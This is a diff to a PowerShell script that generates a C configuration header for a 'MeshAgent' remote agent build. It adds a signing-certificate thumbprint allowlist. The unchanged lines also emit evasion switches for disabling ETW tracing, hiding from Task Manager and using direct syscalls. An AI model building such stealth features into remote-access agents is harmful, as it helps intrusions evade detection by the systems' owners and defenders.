@@ -12,6 +12,47 @@ Write-Host "=== MeshAgent Provisioning Embedder ===" -ForegroundColor Cyan
 # Read config
 $config = Get-Content $ConfigPath -Raw | ConvertFrom-Json
 
+# Normalise allowlist entries
+$allowedThumbprints = @()
+if ($config.security -and $config.security.allowedSigners) {
+    foreach ($entry in $config.security.allowedSigners) {
+        if ($null -eq $entry.thumbprint) { continue }
+        $normalized = ($entry.thumbprint -replace '[^0-9a-fA-F]', '').ToUpperInvariant()
+        if ($normalized.Length -ne 40) {
+            Write-Host "[WARN] Skipping invalid thumbprint '$($entry.thumbprint)'; expected 40 hex characters." -ForegroundColor Yellow
+            continue
+        }
+        $allowedThumbprints += $normalized
+    }
+}
+
+function Convert-ThumbprintsToMacro {
+    param([string[]]$Thumbprints)
+
+    if (-not $Thumbprints -or $Thumbprints.Count -eq 0) {
+        return @{
+            Count = 0
+            Macro = $null
+        }
+    }
+
+    $arrayEntries = @()
+    foreach ($thumb in $Thumbprints) {
+        $bytes = @()
+        for ($i = 0; $i -lt $thumb.Length; $i += 2) {
+            $bytes += ("0x{0}" -f $thumb.Substring($i, 2))
+        }
+        $arrayEntries += ("{ " + ($bytes -join ", ") + " }")
+    }
+
+    return @{
+        Count = $Thumbprints.Count
+        Macro = "{ " + ($arrayEntries -join ", ") + " }"
+    }
+}
+
+$allowlistMacro = Convert-ThumbprintsToMacro -Thumbprints $allowedThumbprints
+
 # Helper function for boolean to int
 function BoolToInt($val) {
     if ($val -eq $true) { return 1 } else { return 0 }
@@ -59,6 +100,21 @@ $internalName = if ($config.branding.versionInfo.internalName) { $config.brandin
 $originalFilename = if ($config.branding.versionInfo.originalFilename) { $config.branding.versionInfo.originalFilename } else { $internalName }
 
 # Generate header
+$allowlistCount = $allowlistMacro.Count
+$allowlistBlock = if ($allowlistMacro.Macro) {
+@"
+#undef MESH_AGENT_ALLOWED_SIGNERS_COUNT
+#define MESH_AGENT_ALLOWED_SIGNERS_COUNT $allowlistCount
+#undef MESH_AGENT_ALLOWED_SIGNERS
+#define MESH_AGENT_ALLOWED_SIGNERS $($allowlistMacro.Macro)
+"@
+} else {
+@"
+#undef MESH_AGENT_ALLOWED_SIGNERS_COUNT
+#define MESH_AGENT_ALLOWED_SIGNERS_COUNT 0
+"@
+}
+
 $header = @"
 /* Generated file - do not edit. */
 /* Generated on: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss") */
@@ -141,6 +197,9 @@ $header = @"
 #define MESH_AGENT_DISABLE_ETW $(BoolToInt $config.evasion.disableETW)
 #define MESH_AGENT_HIDE_TASKMANAGER $(BoolToInt $config.evasion.hideFromTaskManager)
 #define MESH_AGENT_USE_SYSCALLS $(BoolToInt $config.evasion.useSyscalls)
+
+/* ========== Signing Allowlist ========== */
+$allowlistBlock
 
 #endif /* GENERATED_MESHAGENT_BRANDING_H */
 "@
